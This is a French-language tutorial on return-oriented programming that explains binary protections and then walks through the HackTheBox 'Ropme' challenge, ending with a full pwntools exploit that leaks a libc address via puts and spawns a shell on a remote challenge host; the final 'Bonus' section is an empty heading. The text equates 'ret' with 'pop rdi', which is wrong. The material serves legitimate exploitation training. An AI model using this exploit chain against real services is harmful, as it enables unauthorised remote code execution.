---
title: "Return-oriented programming (ROP)"
description: Article théorique et pratique sur le ROP
---

# Sommaire
1. [Les sections/segments d'un binaire](#Les_sections)
2. [Les protections](#Les_protections)
3. [Qu'est ce que le ROP ?](#ROP)
4. [Exploitation + Walkthrough ROPME - HackTheBox](#ropme)
5. [Bonus - ROP Chain via le gadget int 0x80](#bonus_ropchain)


Avant de commencer à vous expliquer le ROP je vais devoir vous expliquer avant tout quelques notions essentielles à la bonne compréhension de la suite de cette article ! 😀


<div id='Les_sections'/>
# Les sections/segments d'un binaire

Pour le ROP nous allons nous intéréssé particulièrement à ces sections :

### Global Offset Table (GOT)

La GOT (Global Offset Table) est une section qui effectue une résolution d'adresse de la libc pour un gain de temps au processeur. C'est un tableau de pointeurs qui stocke les vrais adresses des fonctions de la libc.

### Procedure Linkage Table (PLT)

La PLT (Procedure Linkage Table) est une section qui contient du code permettant de résoudre les fonctions de la libc exécutées dans le binaire. C'est une table servant à faire le lien avec les fonctions situées dans des bibliothèques dynamiques. Cette section se trouve à des adresses fixes

### Les segments d'un binaire

- Le segment TEXT contient le code du binaire
- Le segment BSS contient les variables non itilialisées, par exemple en C :
```c
char var[256];
```
- Le segment DATA contient les variables initialisées, par exemple en C : 
```c
char var[256] = "nuts";
```

<div id='Les_protections'/>
# Les protections des exécutables

- **NX** est une protection qui rend la pile Non eXécutable. Cette technique empeche l'exécution d'un shellcode dans la stack. Pour bypass cette protection nous devons effectuer un **ret2libc**, BTW voici un exemple d'exploitation : [HackTheBox - Enterprise](https://nuts7.github.io/articles/htb-enterprise/).

- Le **DEP** (Data Execution Prevention) consiste à protéger les zones de mémoires non exécutables. L'activation de la fonctionnalité DEP consiste à passer le bit NX à 1 dans le processeur.

- L’**ASLR** (Address space layout randomization) est une technique permettant de placer de façon aléatoire les adresses de la stack, du tas et des bibliothèques partagées.

- **PIE** permet de placer de facon aléatoire des emplacements mémoires (comme l'ASLR) mais cette fois ci, pour la zone de code et la zone de donnée.

- Le **stack canary** ou la **Stack Smashing Protection** (SSP) est une protection qui est placé entre le buffer et le couple EBP et EIP (32 bits) ou RBP et RIP (64 bits). Si la valeur du canary est réecrite avec la mauvaise valeur alors le programme se ferme. (4 octets en 32 bits, 8 octets en 64 bits) Cependant, en assembleur nos ordinateurs vérifient octets par octets les chaines de caractères, alors nous pouvons brute force byte par byte la valeur du canary afin de la leak et de réecrire la bonne valeur du canary.

- Le **Fortify Source** permet de détecter certaines erreurs de développement causant un buffer overflow dans le code source d'une application lors de l'utilisation de diverses fonctions de manipulation de chaînes de caractères et de mémoire (par exemple, memcpy, memset, stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf, vsprintf, vsnprintf, gets)

- **RELRO** est une protection permettant de demander au linker de résoudre les fonctions de bibliothèques dynamiques au tout début de l’exécution, et donc de pouvoir remapper la section GOT et GOT.plt en lecture seule. 

<div id='ROP'/>
# Qu'est ce que le ROP ?

Le ROP (Return-oriented programming) est une technique d'exploitation reposant sur la recherche de blocs d'instructions à l'intérieur d'un binaire, ces blocs sont appelés **gadget**. Ces morceaux de code terminent généralement par un ret (= pop rdi), un call ou un jmp. Nous allons pouvoir chainer ces gadgets dans la stack afin d'exécuter une suite d'actions, appelé **ROP Chain**.

<p align="center">
  <img src="https://media.giphy.com/media/q6RoNkLlFNjaw/giphy.gif">
</p>

Le ROP va permettre de bypass principalement des protections telles que NX, l'ASLR et le DEP.

Voici un schéma explicatif d'une ROP Chain :

<p align="center">
  <img src="https://i.imgur.com/PLNqJLP.png">
</p>

<div id='ropme'/>
# Exploitation + Walkthrough ROPME - HackTheBox

Passon à la pratique ! Pour un exemple d'exploitation de ROP Chain via un leak d'adresse de la libc, j'ai décidé d'utiliser le challenge [Ropme de HackTheBox](https://www.hackthebox.eu/home/challenges/download/8). (binaire 64 bits)

Avant tout, essayons de désassembler la fonction main du programme et de trouver une fonction vulnérable aux buffer overflow :

```py
❯ gdb -q ropme
gef➤  disassemble main 
Dump of assembler code for function main:
   0x0000000000400626 <+0>:	push   rbp
   0x0000000000400627 <+1>:	mov    rbp,rsp
   0x000000000040062a <+4>:	sub    rsp,0x50
   0x000000000040062e <+8>:	mov    DWORD PTR [rbp-0x44],edi
   0x0000000000400631 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000400635 <+15>:	mov    edi,0x4006f8
   0x000000000040063a <+20>:	call   0x4004e0 <puts@plt>
   0x000000000040063f <+25>:	mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x0000000000400646 <+32>:	mov    rdi,rax
   0x0000000000400649 <+35>:	call   0x400510 <fflush@plt>
   0x000000000040064e <+40>:	mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400655 <+47>:	lea    rax,[rbp-0x40]
   0x0000000000400659 <+51>:	mov    esi,0x1f4
   0x000000000040065e <+56>:	mov    rdi,rax
   0x0000000000400661 <+59>:	call   0x400500 <fgets@plt> # VULN FUNCTION
   0x0000000000400666 <+64>:	mov    eax,0x0
   0x000000000040066b <+69>:	leave  
   0x000000000040066c <+70>:	ret    
End of assembler dump.
gef➤  quit
❯ python2 -c "print 'A' * 100" | ./ropme
ROP me outside, how 'about dah?
[1]    68022 done                              python2 -c "print 'A' * 100" | 
       68023 segmentation fault (core dumped)  ./ropme
```

Ici la fonction fgets ne vérifie pas le nombre d'octets entrée par l'utilisateur du programme. Par conséquent nous avons pu faire segfault le binaire avec une saisie trop importante par rapport à l'espace alloué par le buffer.


Ensuite, comme dans un buffer overflow basique nous devons récupérer l'offset afin d'overwrite nos registres avec une adresse valide à la place de nos "A", soit 0x41 en hexadécimal.<br/>
Pour se faire nous allons créer un pattern de 100 chars, lancer le programme avec ce pattern et chercher à quelle offset se trouve le push RBP au prologue de la fonction fgets :

```py
gef➤  pattern create 100    # Create pattern of 100 bytes
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  run   # Run the program with the pattern
Starting program: /home/nuts/ropme 
ROP me outside, how 'about dah?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x000000000040066c in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0000000000400670  →  <__libc_csu_init+0> push r15
$rcx   : 0x0000000000602715  →  0x0000000000000000
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb78  →  "jaaaaaaakaaaaaaalaaaaaaamaaa\n"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?) 
$rsi   : 0x00000000006026b1  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
$rdi   : 0x00007ffff7f844e0  →  0x0000000000000000
$rip   : 0x000000000040066c  →  <main+70> ret 
$r8    : 0x00007fffffffdb30  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$r9    : 0x00007ffff7f81a60  →  0x0000000000602ab0  →  0x0000000000000000
$r10   : 0x40              
$r11   : 0x246             
$r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb78│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa\n"	 ← $rsp
0x00007fffffffdb80│+0x0008: "kaaaaaaalaaaaaaamaaa\n"
0x00007fffffffdb88│+0x0010: "laaaaaaamaaa\n"
0x00007fffffffdb90│+0x0018: 0x0000000a6161616d ("maaa\n"?)
0x00007fffffffdb98│+0x0020: 0x00007fffffffe039  →  0x0ba53f89a8f5d8c3
0x00007fffffffdba0│+0x0028: 0x0000000000400670  →  <__libc_csu_init+0> push r15
0x00007fffffffdba8│+0x0030: 0xd97e9c55920317fc
0x00007fffffffdbb0│+0x0038: 0x0000000000400530  →  <_start+0> xor ebp, ebp
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400661 <main+59>        call   0x400500 <fgets@plt>
     0x400666 <main+64>        mov    eax, 0x0
     0x40066b <main+69>        leave  
 →   0x40066c <main+70>        ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ropme", stopped 0x40066c in main (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40066c → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search iaaaaaaa   # Find bytes to overwrite RBP
[+] Searching 'iaaaaaaa'
[+] Found at offset 64 (little-endian search)
```

Nous avons donc un offset de 64 caractères (buffer) ainsi qu'un padding de 72 octets avant d'écraser la sauvegarde RIP.

Un ret2libc afin d'exécuter un shellcode dans la stack aurait été suffisant si le bit NX était désactivé, cependant ce n'est pas le cas, ainsi l'ASLR est activé sur le serveur distant :

```py
❯ checksec --file=ropme
[*] '/home/nuts/ropme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Commencons notre ROP Chain par la recherche de gadgets utiles pour notre exploitation avec [Ropper](https://github.com/sashs/Ropper) ou [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) :

```py
❯ ROPgadget --binary=ropme
Gadgets information
============================================================
0x0000000000400582 : adc byte ptr [rax], ah ; jmp rax
0x0000000000400581 : adc byte ptr [rax], spl ; jmp rax
0x000000000040057e : adc dword ptr [rbp - 0x41], ebx ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400507 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004006df : add bl, dh ; ret
0x00000000004006dd : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004006db : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004004e7 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4004d0
0x0000000000400667 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x000000000040058c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006dc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400668 : add byte ptr [rax], al ; add cl, cl ; ret
0x00000000004004c3 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004004e9 : add byte ptr [rax], al ; jmp 0x4004d0
0x0000000000400669 : add byte ptr [rax], al ; leave ; ret
0x000000000040058e : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006de : add byte ptr [rax], al ; ret
0x0000000000400608 : add byte ptr [rbp + 5], dh ; jmp 0x4005a0
0x00000000004005f8 : add byte ptr [rcx], al ; ret
0x000000000040066a : add cl, cl ; ret
0x00000000004006c0 : add dword ptr [rax + 0x39], ecx ; jmp 0x40073a
0x00000000004004f7 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004005f4 : add eax, 0x200a6e ; add ebx, esi ; ret
0x0000000000400517 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x4004d0
0x00000000004005f9 : add ebx, esi ; ret
0x00000000004004c6 : add esp, 8 ; ret
0x00000000004004c5 : add rsp, 8 ; ret
0x00000000004005f7 : and byte ptr [rax], al ; add ebx, esi ; ret
0x00000000004004e4 : and byte ptr [rax], al ; push 0 ; jmp 0x4004d0
0x00000000004004f4 : and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x0000000000400504 : and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400514 : and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x0000000000400502 : and cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 2 ; jmp 0x4004d0
0x0000000000400747 : call qword ptr [rax]
0x0000000000400625 : call qword ptr [rbp + 0x48]
0x000000000040061e : call rax
0x0000000000400606 : cmp dword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x0000000000400605 : cmp qword ptr [rdi], 0 ; jne 0x400610 ; jmp 0x4005a0
0x00000000004006bc : fmul qword ptr [rax - 0x7d] ; ret
0x0000000000400619 : int1 ; push rbp ; mov rbp, rsp ; call rax
0x000000000040057d : je 0x400590 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004005cb : je 0x4005d8 ; pop rbp ; mov edi, 0x601048 ; jmp rax
0x0000000000400618 : je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004eb : jmp 0x4004d0
0x000000000040060b : jmp 0x4005a0
0x00000000004006c3 : jmp 0x40073a
0x00000000004007eb : jmp qword ptr [rbp]
0x0000000000400585 : jmp rax
0x0000000000400609 : jne 0x400610 ; jmp 0x4005a0
0x000000000040066b : leave ; ret
0x00000000004005f3 : mov byte ptr [rip + 0x200a6e], 1 ; ret
0x0000000000400666 : mov eax, 0 ; leave ; ret
0x000000000040061c : mov ebp, esp ; call rax
0x0000000000400580 : mov edi, 0x601048 ; jmp rax
0x000000000040061b : mov rbp, rsp ; call rax
0x0000000000400588 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004006d8 : nop dword ptr [rax + rax] ; ret
0x00000000004005d5 : nop dword ptr [rax] ; pop rbp ; ret
0x00000000004005f6 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
0x00000000004005cc : or ebx, dword ptr [rbp - 0x41] ; adc byte ptr [rax], spl ; jmp rax
0x00000000004005f5 : outsb dx, byte ptr [rsi] ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
0x00000000004006cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ce : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006d0 : pop r14 ; pop r15 ; ret
0x00000000004006d2 : pop r15 ; ret
0x0000000000400620 : pop rbp ; jmp 0x4005a0
0x00000000004005f2 : pop rbp ; mov byte ptr [rip + 0x200a6e], 1 ; ret
0x000000000040057f : pop rbp ; mov edi, 0x601048 ; jmp rax
0x00000000004006cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006cf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400590 : pop rbp ; ret
0x00000000004006d3 : pop rdi ; ret
0x00000000004006d1 : pop rsi ; pop r15 ; ret
0x00000000004006cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : push 0 ; jmp 0x4004d0
0x00000000004004f6 : push 1 ; jmp 0x4004d0
0x0000000000400506 : push 2 ; jmp 0x4004d0
0x0000000000400516 : push 3 ; jmp 0x4004d0
0x000000000040061a : push rbp ; mov rbp, rsp ; call rax
0x00000000004004c9 : ret
0x000000000040064a : ret 0xfffe
0x00000000004005ca : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x000000000040057c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; adc byte ptr [rax], spl ; jmp rax
0x0000000000400617 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax
0x0000000000400512 : sbb cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 3 ; jmp 0x4004d0
0x00000000004004f2 : sub cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 1 ; jmp 0x4004d0
0x00000000004006e5 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004006e4 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000040058a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00000000004006da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000400616 : test eax, eax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x0000000000400615 : test rax, rax ; je 0x40060b ; push rbp ; mov rbp, rsp ; call rax
0x00000000004004e2 : xor cl, byte ptr [rbx] ; and byte ptr [rax], al ; push 0 ; jmp 0x4004d0

Unique gadgets found: 93
```

Nous avons un gadget particulièrement intéréssant dans ce binaire : `pop rdi ; ret` à l'adresse `0x4006d3`. Cette instruction permet de passer un 1er argument à une fonction.<br/>
Nous pouvons passer des arguments à des fonctions avec ces gadgets :

> **1er** argument = `pop rdi ; ret`

> **2ème** argument = `pop rsi ; ret`

> **3ème** argument = `pop rdx ; ret`

<br/>
Le but va etre d'effectuer un **ret2plt** afin d'exécuter une fonction contenue dans la GOT (ici puts car system n'est pas dans la GOT du programme) :

```py
gef➤  got

GOT protection: Partial RelRO | GOT functions: 4
 
[0x601018] puts@GLIBC_2.2.5  →  0x4004e0
[0x601020] __libc_start_main@GLIBC_2.2.5  →  0x7ffff7de7a50
[0x601028] fgets@GLIBC_2.2.5  →  0x400506
[0x601030] fflush@GLIBC_2.2.5  →  0x400516
```

Dans ce cas nous allons pouvoir afficher l'adresse d'une fonction de la GOT afin de calculer la distance entre cette fonction et la fonction system car l'ASLR est random mais la distance entre les fonctions dans la GOT ne change pas.
Mais à quoi ca sert de passer à argument ? (pop rdi ; ret) Et bien cela va permettre de passer en argument à puts la valeur de l'adresse de puts dans la GOT ainsi nous pourrons calculer la différence entre cette fonction et la fonction system 


_TL;DR_ : ropchain = puts(addr_puts) + main + system(/bin/sh)

```py
from pwn import *

HOST, PORT = '178.62.118.108', 30396 

#p = process('./ropme', stdin=PTY)
p = remote(HOST, PORT)
elf = ELF('./ropme')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

padding = b'A' * 72 # offset to overwrite RBP
gadget = 0x4006d3 # pop rdi ; ret
puts_plt = elf.plt['puts'] # 0x4004e0 (plt in GEF)
puts_got = elf.got['puts'] # 0x601018 (got in GEF)
addr_main = elf.symbols['main'] # 0x400626 (1st Address Prologue Main Function)

p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld

pld = b''
pld += padding # buffer + overwrite RBP (8 octets)
pld += p64(gadget) # 1 argument (pop rdi ; ret)
pld += p64(puts_got) # to save addr puts of GOT in rdi register
pld += p64(puts_plt) # to print puts GOT
pld += p64(addr_main) # ret2main
p.sendline(pld) # send payload

puts_leak = u64(p.recvline().strip().ljust(8, b'\x00')) # to get valid address
log.info('Addr puts (GOT) leak : {}'.format(hex(puts_leak))) # print address puts leaked

libc_puts = 0x06f690
libc_binsh = 0x18cd17
libc_system = 0x045390

libc_base = puts_leak - libc_puts # calculate addr base
log.info('libc base at ' + hex(libc_base))

addr_system = libc_base + libc_system # calculate difference between base and system function

binsh = libc_base + libc_binsh # calculate difference between base and /bin/sh

log.info('System at ' + hex(addr_system))
log.info('/bin/sh at ' + hex(binsh))

p.recvuntil('ROP me outside, how \'about dah?\n') # wait str to send pld

pld = b''
pld += padding # offset to go save EIP 
pld += p64(gadget) # gadget to pass a parameter to called function (pop rdi ; ret)
pld += p64(binsh) # 
pld += p64(addr_system)

p.sendline(pld) # send payload 
p.interactive() # spawn interactive shell

p.close()
```

<p align="center">
  <img src="https://media.giphy.com/media/VY20vTr6KCbOBKiGIL/giphy.gif">
</p>

<div id='bonus_ropchain'/>
# Bonus - ROP Chain via le gadget int 0x80
